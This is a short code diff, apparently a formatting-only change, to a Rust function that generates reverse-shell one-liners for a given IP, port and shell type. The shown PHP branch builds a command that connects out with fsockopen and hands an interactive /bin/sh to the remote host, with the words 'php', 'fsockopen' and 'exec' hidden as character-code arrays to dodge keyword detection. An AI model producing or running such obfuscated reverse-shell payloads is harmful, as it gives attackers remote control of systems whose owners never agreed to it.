@@ -1,4 +1,4 @@
-use base64::{engine::general_purpose::STANDARD, Engine};
+use base64::{Engine, engine::general_purpose::STANDARD};
 use colored::Colorize;
 
 pub fn generate(shell_type: &str, ip: &str, port: u16, encode_b64: bool) -> String {
@@ -35,8 +35,14 @@ pub fn generate(shell_type: &str, ip: &str, port: u16, encode_b64: bool) -> Stri
         }
         "php" => {
             let p: String = [112, 104, 112].iter().map(|c| *c as u8 as char).collect();
-            let f: String = [102, 115, 111, 99, 107, 111, 112, 101, 110].iter().map(|c| *c as u8 as char).collect();
-            let e: String = [101, 120, 101, 99].iter().map(|c| *c as u8 as char).collect();
+            let f: String = [102, 115, 111, 99, 107, 111, 112, 101, 110]
+                .iter()
+                .map(|c| *c as u8 as char)
+                .collect();
+            let e: String = [101, 120, 101, 99]
+                .iter()
+                .map(|c| *c as u8 as char)
+                .collect();
             format!(
                 "{} -r '${}(\"{}\",{});{}(\"/bin/sh -i <&3 >&3 2>&3\");'",
                 p, f, ip, port, e
